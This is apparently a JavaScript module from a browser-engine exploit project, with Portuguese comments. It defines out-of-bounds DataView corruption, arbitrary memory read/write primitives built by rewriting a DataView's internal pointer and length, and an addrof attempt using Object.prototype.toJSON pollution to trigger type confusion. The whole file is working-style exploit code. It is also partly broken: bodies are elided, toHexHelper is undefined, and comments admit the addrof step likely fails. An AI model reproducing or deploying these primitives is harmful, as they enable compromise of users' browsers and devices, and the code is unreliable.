// js/core_exploit.mjs (ATUALIZADO - v22: Primitivas de baixo nível para controle de DV)

import { AdvancedInt64, isAdvancedInt64Object, PAUSE, toHex } from './utils.mjs';
import { logS3 as log } from './script3/s3_utils.mjs';
import { OOB_CONFIG, JSC_OFFSETS, updateOOBConfigFromUI } from './config.mjs';

export let oob_array_buffer_real = null;
export let oob_dataview_real = null;
let isOOBEnvironmentSetup = false;

// Snapshots dos metadados originais do oob_dataview_real
let original_dv_m_vector = null;
let original_dv_m_length = null;
let original_dv_m_mode = null;
let isDVInArbMode = false; // Flag para saber se o DV está configurado para acesso arbitrário

const OOB_DV_METADATA_BASE_IN_OOB_BUFFER = 0x58;
const OOB_DV_M_VECTOR_OFFSET = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET;
const OOB_DV_M_LENGTH_OFFSET = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET;
const OOB_DV_M_MODE_OFFSET = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.M_MODE_OFFSET;

export function clearOOBEnvironment(options = { force_clear_even_if_not_setup: false }) {
    oob_array_buffer_real = null; oob_dataview_real = null; isOOBEnvironmentSetup = false;
    original_dv_m_vector = null; original_dv_m_length = null; original_dv_m_mode = null;
    isDVInArbMode = false;
}
// ... getOOBAllocationSize, getBaseOffsetInDV, getInitialBufferSize mantidos ...
export function getOOBAllocationSize() { if (typeof updateOOBConfigFromUI === "function" && typeof document !== "undefined") { updateOOBConfigFromUI(document); } return OOB_CONFIG.ALLOCATION_SIZE; }
export function getBaseOffsetInDV() { if (typeof updateOOBConfigFromUI === "function" && typeof document !== "undefined") { updateOOBConfigFromUI(document); } return OOB_CONFIG.BASE_OFFSET_IN_DV; }
export function getInitialBufferSize() { if (typeof updateOOBConfigFromUI === "function" && typeof document !== "undefined") { updateOOBConfigFromUI(document); } return OOB_CONFIG.INITIAL_BUFFER_SIZE; }


export async function triggerOOB_primitive(options = { force_reinit: false }) {
    // ... (lógica de triggerOOB_primitive mantida como na v17_base/v21, expandindo m_length) ...
    const FNAME_TRIGGER = 'CoreExploit.triggerOOB_primitive';
    if (isOOBEnvironmentSetup && !options.force_reinit) { /* ... checagem ... */ return true; }
    const currentAllocSize = getOOBAllocationSize();
    clearOOBEnvironment({ force_clear_even_if_not_setup: true });
    try {
        oob_array_buffer_real = new ArrayBuffer(currentAllocSize);
        oob_dataview_real = new DataView(oob_array_buffer_real, 0, currentAllocSize);
        if (currentAllocSize > OOB_DV_M_LENGTH_OFFSET + 3) {
            oob_dataview_real.setUint32(OOB_DV_M_LENGTH_OFFSET, 0xFFFFFFFF, true);
        } else { throw new Error("Falha ao expandir m_length."); }
        isOOBEnvironmentSetup = true;
        log(`Ambiente OOB CONFIGURADO e m_length expandido.`, 'good', FNAME_TRIGGER);
        return true;
    } catch (e) { /* ... tratamento de erro ... */ throw e; }
}

// oob_read_absolute e oob_write_absolute mantidas para acesso ao oob_array_buffer_real
export function oob_read_absolute(offset, byteLength) { /* ... como na v17_base ... */ 
    if (!isOOBEnvironmentSetup || !oob_dataview_real || !oob_array_buffer_real) throw new Error("OOB não pronto para oob_read_absolute.");
    if (offset < 0 || (offset + byteLength) > oob_array_buffer_real.byteLength) throw new RangeError("oob_read_absolute fora dos limites.");
    switch (byteLength) {
        case 1: return oob_dataview_real.getUint8(offset);
        case 2: return oob_dataview_real.getUint16(offset, true);
        case 4: return oob_dataview_real.getUint32(offset, true);
        case 8: return new AdvancedInt64(oob_dataview_real.getUint32(offset, true), oob_dataview_real.getUint32(offset + 4, true));
        default: throw new Error("Invalid byteLength");
    }
}
export function oob_write_absolute(offset, value, byteLength) { /* ... como na v17_base ... */
    if (!isOOBEnvironmentSetup || !oob_dataview_real || !oob_array_buffer_real) throw new Error("OOB não pronto para oob_write_absolute.");
    if (offset < 0 || (offset + byteLength) > oob_array_buffer_real.byteLength) throw new RangeError("oob_write_absolute fora dos limites.");
    let val64;
    switch (byteLength) {
        case 1: oob_dataview_real.setUint8(offset, Number(value)); break;
        case 2: oob_dataview_real.setUint16(offset, Number(value), true); break;
        case 4: oob_dataview_real.setUint32(offset, Number(value), true); break;
        case 8:
            val64 = isAdvancedInt64Object(value) ? value : new AdvancedInt64(value);
            oob_dataview_real.setUint32(offset, val64.low(), true);
            oob_dataview_real.setUint32(offset + 4, val64.high(), true);
            break;
        default: throw new Error("Invalid byteLength");
    }
}
export function isOOBReady() { /* ... como na v17_base ... */ 
    let mLengthExpanded = false;
    if (isOOBEnvironmentSetup && oob_dataview_real && oob_array_buffer_real) {
        try { if (oob_array_buffer_real.byteLength > OOB_DV_M_LENGTH_OFFSET + 3) {
                 mLengthExpanded = (oob_dataview_real.getUint32(OOB_DV_M_LENGTH_OFFSET, true) === 0xFFFFFFFF); }
        } catch (e) { mLengthExpanded = false; }
    }
    return isOOBEnvironmentSetup && oob_array_buffer_real && oob_dataview_real && mLengthExpanded;
}

// =======================================================================================
// PRIMITIVAS DE CONTROLE DE DATAVIEW DE BAIXO NÍVEL (v22)
// =======================================================================================
export function setup_arb_access(absolute_address) {
    const FNAME = 'CoreExploit.setup_arb_access';
    if (!isOOBReady()) { throw new Error("Ambiente OOB não pronto para setup_arb_access."); }
    if (isDVInArbMode) { log(`AVISO: Chamando setup_arb_access quando DV já estava em modo arbitrário. Restaurando primeiro.`, 'warn', FNAME); restore_oob_dv_metadata(); }

    let addr64 = absolute_address;
    if (!isAdvancedInt64Object(addr64)) { addr64 = new AdvancedInt64(addr64); }

    original_dv_m_vector = oob_read_absolute(OOB_DV_M_VECTOR_OFFSET, 8);
    original_dv_m_length = oob_read_absolute(OOB_DV_M_LENGTH_OFFSET, 4);
    original_dv_m_mode   = oob_read_absolute(OOB_DV_M_MODE_OFFSET, 4);
    
    oob_write_absolute(OOB_DV_M_VECTOR_OFFSET, addr64, 8);
    oob_write_absolute(OOB_DV_M_LENGTH_OFFSET, 0xFFFFFFFF, 4);
    isDVInArbMode = true;
    // log(`    [${FNAME}] oob_dataview_real configurado para ${addr64.toString(true)}`, 'debug');
}

export function restore_oob_dv_metadata() {
    const FNAME = 'CoreExploit.restore_oob_dv_metadata';
    if (!isOOBReady()) { log(`AVISO: Tentando restaurar metadados, mas OOB não está pronto.`, 'warn', FNAME); return; }
    if (!isDVInArbMode) { /*log(`AVISO: Chamando restore_oob_dv_metadata quando DV não estava em modo arbitrário.`, 'debug', FNAME);*/ return; }
    if (original_dv_m_vector && typeof original_dv_m_length === 'number' && typeof original_dv_m_mode === 'number') {
        try {
            oob_write_absolute(OOB_DV_M_VECTOR_OFFSET, original_dv_m_vector, 8);
            oob_write_absolute(OOB_DV_M_LENGTH_OFFSET, original_dv_m_length, 4);
            oob_write_absolute(OOB_DV_M_MODE_OFFSET, original_dv_m_mode, 4);
            isDVInArbMode = false;
            // log(`    [${FNAME}] Metadados do oob_dataview_real restaurados.`, 'debug');
        } catch (e) {
            log(`ERRO CRÍTICO ao restaurar metadados: ${e.message}`, 'critical', FNAME);
            isOOBEnvironmentSetup = false; // Marca ambiente como potencialmente corrupto
            throw e;
        }
    } else {
        log(`AVISO: Snapshots de metadados originais inválidos. Não foi possível restaurar.`, 'warn', FNAME);
    }
}

// perform_raw_read/write operam no oob_dataview_real JÁ CONFIGURADO por setup_arb_access
export function perform_raw_read(offset_from_current_m_vector, byteLength) {
    if (!isDVInArbMode) throw new Error("Chame setup_arb_access antes de perform_raw_read.");
    // oob_dataview_real já está apontando para o endereço absoluto. O offset aqui é 0.
    switch (byteLength) {
        case 1: return oob_dataview_real.getUint8(offset_from_current_m_vector);
        case 2: return oob_dataview_real.getUint16(offset_from_current_m_vector, true);
        case 4: return oob_dataview_real.getUint32(offset_from_current_m_vector, true);
        case 8: return new AdvancedInt64(
            oob_dataview_real.getUint32(offset_from_current_m_vector, true),
            oob_dataview_real.getUint32(offset_from_current_m_vector + 4, true)
        );
        default: throw new Error("Invalid byteLength for perform_raw_read.");
    }
}
export function perform_raw_write(offset_from_current_m_vector, value, byteLength) {
    if (!isDVInArbMode) throw new Error("Chame setup_arb_access antes de perform_raw_write.");
    let val64;
    switch (byteLength) {
        case 1: oob_dataview_real.setUint8(offset_from_current_m_vector, Number(value)); break;
        case 2: oob_dataview_real.setUint16(offset_from_current_m_vector, Number(value), true); break;
        case 4: oob_dataview_real.setUint32(offset_from_current_m_vector, Number(value), true); break;
        case 8:
            val64 = isAdvancedInt64Object(value) ? value : new AdvancedInt64(value);
            oob_dataview_real.setUint32(offset_from_current_m_vector, val64.low(), true);
            oob_dataview_real.setUint32(offset_from_current_m_vector + 4, val64.high(), true);
            break;
        default: throw new Error("Invalid byteLength for perform_raw_write.");
    }
}

// Funções arb_read/arb_write de alto nível que usam as primitivas de baixo nível
// Elas são agora wrappers que fazem setup, operação raw, e restore.
export function arb_read(absolute_address, byteLength) { // Síncrona
    setup_arb_access(absolute_address);
    try {
        return perform_raw_read(0, byteLength); // Sempre lê do offset 0 do DV reconfigurado
    } finally {
        restore_oob_dv_metadata();
    }
}
export function arb_write(absolute_address, value, byteLength) { // Síncrona
    setup_arb_access(absolute_address);
    try {
        perform_raw_write(0, value, byteLength); // Sempre escreve no offset 0 do DV reconfigurado
    } finally {
        restore_oob_dv_metadata();
    }
}

// ... (Restante do arquivo: selfTestOOBReadWrite, selfTestTypeConfusionAndMemoryControl, attemptAddrofUsingCoreHeisenbug - mantidos como antes)
// O código para essas funções mais antigas é mantido como estava na v17,
// pois a L/E Arbitrária já foi validada e a Heisenbug/addrof são conhecidas por falhar no ambiente.
export async function selfTestOOBReadWrite(logFnParam) {
    const currentLog = logFnParam || log;
    const FNAME_TEST = 'CoreExploit.selfTestOOBReadWrite';
    currentLog(`--- Iniciando Auto-Teste de OOB R/W (com re-inicialização forçada) ---`, 'test', FNAME_TEST);
    try {
        await triggerOOB_primitive({ force_reinit: true });
        const test_offset = 0x50;
        const test_val32 = 0x11223344;
        oob_write_absolute(test_offset, test_val32, 4);
        const read_val32 = oob_read_absolute(test_offset, 4);
        if (read_val32 === test_val32) {
            currentLog(`SUCESSO: Lido ${toHexHelper(read_val32)} corretamente (32bit).`, "good", FNAME_TEST);
        } else {
            currentLog(`FALHA: Lido ${toHexHelper(read_val32)}, esperado ${toHexHelper(test_val32)}.`, "error", FNAME_TEST); throw new Error("Self-test 32bit failed");
        }
        const next_offset = test_offset + 8;
        const test_val64 = new AdvancedInt64(0xAABBCCDD, 0xEEFF0011);
        oob_write_absolute(next_offset, test_val64, 8);
        const read_val64 = oob_read_absolute(next_offset, 8);
        if (isAdvancedInt64Object(read_val64) && read_val64.equals(test_val64)) {
            currentLog(`SUCESSO: Lido ${read_val64.toString(true)} corretamente (64bit).`, "good", FNAME_TEST);
        } else {
            currentLog(`FALHA: Lido ${isAdvancedInt64Object(read_val64) ? read_val64.toString(true) : String(read_val64)}, esperado ${test_val64.toString(true)}.`, "error", FNAME_TEST); throw new Error("Self-test 64bit failed");
        }
        currentLog(`--- Auto-Teste de OOB R/W Concluído ---`, 'test', FNAME_TEST);
        return true;
    } catch (e) {
        currentLog(`ERRO no Auto-Teste OOB R/W: ${e.message}`, 'critical', FNAME_TEST);
        return false;
    }
}

const HEISENBUG_OOB_DATAVIEW_METADATA_BASE = OOB_DV_METADATA_BASE_IN_OOB_BUFFER;
const HEISENBUG_OOB_DATAVIEW_MLENGTH_OFFSET = JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET;
const HEISENBUG_CRITICAL_WRITE_OFFSET = HEISENBUG_OOB_DATAVIEW_METADATA_BASE + HEISENBUG_OOB_DATAVIEW_MLENGTH_OFFSET;
const HEISENBUG_CRITICAL_WRITE_VALUE = 0xFFFFFFFF;
const HEISENBUG_VICTIM_AB_SIZE = 64;

export async function selfTestTypeConfusionAndMemoryControl(logFnParam) {
    const currentLog = logFnParam || log;  
    const FNAME_TEST = 'CoreExploit.selfTestTypeConfusionAndMemoryControl';
    currentLog(`--- Iniciando Auto-Teste Combinado: Type Confusion e Controle de Metadados ---`, 'test', FNAME_TEST);

    let originalToJSONDescriptor = null;
    let pollutionApplied = false;
    let local_probe_details_for_selftest = null;
    let overallSuccess = true;

    try { 
        currentLog(`FASE 1: Testando Type Confusion (HEISENBUG)...`, 'subtest', FNAME_TEST);
        await triggerOOB_primitive({ force_reinit: true });
        if (!isOOBReady()) { throw new Error("Falha ao inicializar ambiente OOB para teste de Type Confusion."); }
        currentLog(`    (TC SelfTest) Alvo da corrupção OOB (HEISENBUG_CRITICAL_WRITE_OFFSET): ${toHexHelper(HEISENBUG_CRITICAL_WRITE_OFFSET)}`, 'info', FNAME_TEST);
        oob_write_absolute(HEISENBUG_CRITICAL_WRITE_OFFSET, HEISENBUG_CRITICAL_WRITE_VALUE, 4);
        currentLog(`        (TC SelfTest) Escrita OOB crítica realizada.`, "info", FNAME_TEST);
        await PAUSE(100);

        let victim_ab_for_selftest = new ArrayBuffer(HEISENBUG_VICTIM_AB_SIZE);
        currentLog(`    (TC SelfTest) victim_ab_for_selftest (tamanho ${HEISENBUG_VICTIM_AB_SIZE} bytes) criado.`, "info", FNAME_TEST);

        const toJSON_ProbeForSelfTest = function() {
            local_probe_details_for_selftest = {
                this_type_in_toJSON: Object.prototype.toString.call(this),
                is_victim: (this === victim_ab_for_selftest)
            };
            return { self_test_probe_executed_tc: true };
        };
        const ppKey_TC = 'toJSON';
        originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_TC);
        Object.defineProperty(Object.prototype, ppKey_TC, { value: toJSON_ProbeForSelfTest, writable: true, configurable: true, enumerable: false });
        pollutionApplied = true;
        currentLog(`        (TC SelfTest) Object.prototype.${ppKey_TC} poluído com sonda.`, "info", FNAME_TEST);
        
        JSON.stringify(victim_ab_for_selftest); 
        currentLog(`        (TC SelfTest) Detalhes da sonda: ${local_probe_details_for_selftest ? JSON.stringify(local_probe_details_for_selftest) : 'N/A'}`, "leak", FNAME_TEST);

        if (local_probe_details_for_selftest && local_probe_details_for_selftest.is_victim && local_probe_details_for_selftest.this_type_in_toJSON === "[object Object]") {
            currentLog(`    (TC SelfTest) SUCESSO: Confusão de tipo detectada! 'this' é [object Object] e é a vítima.`, "vuln", FNAME_TEST);
        } else {
            let detailsMsg = local_probe_details_for_selftest ? `is_victim=${local_probe_details_for_selftest.is_victim}, type=${local_probe_details_for_selftest.this_type_in_toJSON}` : "sonda não forneceu detalhes";
            currentLog(`    (TC SelfTest) FALHA: Teste de Type Confusion. Detalhes: ${detailsMsg}. Esperado [object Object] e is_victim=true.`, "error", FNAME_TEST);
            overallSuccess = false;
        }
    } catch (e) {
        currentLog(`ERRO na FASE 1 (Type Confusion - SelfTest): ${e.message}`, 'critical', FNAME_TEST);
        overallSuccess = false;
    } finally {
        if (pollutionApplied) {
            if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey_TC, originalToJSONDescriptor);
            else delete Object.prototype['toJSON'];
            currentLog(`        (TC SelfTest) Object.prototype.${ppKey_TC} restaurado.`, "info", FNAME_TEST);
        }
    }

    if (overallSuccess) { 
        await PAUSE(200);
        currentLog(`FASE 2: Testando Controle de Metadados (m_length, m_mode)...`, 'subtest', FNAME_TEST);
        try {
            if (!isOOBReady()) { 
                await triggerOOB_primitive({ force_reinit: true }); 
                if (!isOOBReady()) throw new Error("Falha ao (re)inicializar ambiente OOB para teste de Controle de Metadados.");
            }
            const PLANT_M_LENGTH = 0x12345678;
            const PLANT_M_MODE = 0x00000003; 
            currentLog(`    (MC) Escrevendo m_length=${toHexHelper(PLANT_M_LENGTH)} em @${toHexHelper(OOB_DV_M_LENGTH_OFFSET)}`, 'info', FNAME_TEST);
            oob_write_absolute(OOB_DV_M_LENGTH_OFFSET, PLANT_M_LENGTH, 4);
            currentLog(`    (MC) Escrevendo m_mode=${toHexHelper(PLANT_M_MODE)} em @${toHexHelper(OOB_DV_M_MODE_OFFSET)}`, 'info', FNAME_TEST);
            oob_write_absolute(OOB_DV_M_MODE_OFFSET, PLANT_M_MODE, 4);
            const read_m_length_val = oob_read_absolute(OOB_DV_M_LENGTH_OFFSET, 4);
            const read_m_mode_val = oob_read_absolute(OOB_DV_M_MODE_OFFSET, 4);
            currentLog(`        Lido m_length: ${toHexHelper(read_m_length_val)}`, "leak", FNAME_TEST);
            currentLog(`        Lido m_mode: ${toHexHelper(read_m_mode_val)}`, "leak", FNAME_TEST);
            let memoryControlSuccess = true;
            if (read_m_length_val !== PLANT_M_LENGTH) {
                currentLog(`    (MC) FALHA: m_length lido não corresponde ao plantado.`, "error", FNAME_TEST);
                memoryControlSuccess = false;
            }
            if (read_m_mode_val !== PLANT_M_MODE) {
                currentLog(`    (MC) FALHA: m_mode lido não corresponde ao plantado.`, "error", FNAME_TEST);
                memoryControlSuccess = false;
            }
            if (memoryControlSuccess) {
                currentLog(`    (MC) SUCESSO: Controle de m_length e m_mode verificado!`, "vuln", FNAME_TEST);
            } else {
                currentLog(`    (MC) FALHA: Teste de Controle de m_length/m_mode.`, "error", FNAME_TEST);
                overallSuccess = false;
            }
        } catch (e) {
            currentLog(`ERRO na FASE 2 (Controle de Metadados - SelfTest): ${e.message}`, 'critical', FNAME_TEST);
            overallSuccess = false;
        }
    } else {
         currentLog(`FASE 1 (Type Confusion) falhou, pulando FASE 2 (Controle de Metadados).`, 'warn', FNAME_TEST);
    }

    currentLog(`--- Auto-Teste Combinado CONCLUÍDO ${overallSuccess ? 'COM SUCESSO' : 'COM FALHA'} ---`, 'test', FNAME_TEST);
    return overallSuccess;
}

let _targetObjectForAddrofProbe = null;
let _heisenbugConfirmedByProbe = false;
function _toJSONProbeForAddrofInCore() { /* ... mantido como antes ... */ 
    let currentThisType = Object.prototype.toString.call(this);
    if (currentThisType === '[object Object]') {
        _heisenbugConfirmedByProbe = true;
        if (_targetObjectForAddrofProbe) { this[0] = _targetObjectForAddrofProbe; }
    } else { _heisenbugConfirmedByProbe = false; }
    return { core_addrof_probe_executed: true, type_seen: currentThisType };
}
export async function attemptAddrofUsingCoreHeisenbug(targetObject) { /* ... mantido como antes ... */
    const FNAME_FUNC = "CoreExploit.attemptAddrofUsingCoreHeisenbug";
    log(`[${FNAME_FUNC}] AVISO: Primitiva addrof (Heisenbug) provavelmente falhará.`, "warn", FNAME_FUNC);
    _targetObjectForAddrofProbe = targetObject; _heisenbugConfirmedByProbe = false;  
    let addrof_result_internal = { success: false, message: "Addrof (Heisenbug) não iniciado." };
    let originalToJSONDescriptorForCoreAddrof = Object.getOwnPropertyDescriptor(Object.prototype, 'toJSON');
    let pollutedByCoreAddrof = false;
    try {
        await triggerOOB_primitive({ force_reinit: true });
        if (!isOOBReady()) { throw new Error("Ambiente OOB não inicializado para addrof."); }
        oob_write_absolute(HEISENBUG_CRITICAL_WRITE_OFFSET, HEISENBUG_CRITICAL_WRITE_VALUE, 4);
        await PAUSE(100);
        let confused_ab_candidate = new ArrayBuffer(HEISENBUG_VICTIM_AB_SIZE);
        let float_view_on_confused_ab = new Float64Array(confused_ab_candidate);
        float_view_on_confused_ab.fill(0.4455667788);
        Object.defineProperty(Object.prototype, 'toJSON', { value: _toJSONProbeForAddrofInCore, writable: true, configurable: true, enumerable: false });
        pollutedByCoreAddrof = true;
        JSON.stringify(confused_ab_candidate);
        if (_heisenbugConfirmedByProbe) {
            const val_double = float_view_on_confused_ab[0];
            const db_conv = new ArrayBuffer(8); (new Float64Array(db_conv))[0] = val_double;
            const int_arr = new Uint32Array(db_conv);
            addrof_result_internal.leaked_address_as_int64 = new AdvancedInt64(int_arr[0], int_arr[1]);
            if (val_double !== 0 && val_double !== 0.4455667788) { 
                addrof_result_internal.success = true;
                addrof_result_internal.message = "Addrof (Heisenbug) supostamente bem-sucedido.";
            } else { addrof_result_internal.message = "Addrof (Heisenbug) valor lido suspeito."; }
        } else { addrof_result_internal.message = "Addrof (Heisenbug) não confirmada pela sonda."; }
    } catch (e) { addrof_result_internal.message = `Erro Addrof (Heisenbug): ${e.message}`; }
    finally {
        if (pollutedByCoreAddrof) {
            if (originalToJSONDescriptorForCoreAddrof) Object.defineProperty(Object.prototype, 'toJSON', originalToJSONDescriptorForCoreAddrof);
            else delete Object.prototype.toJSON;
        }
        _targetObjectForAddrofProbe = null;
    }
    return addrof_result_internal;
}
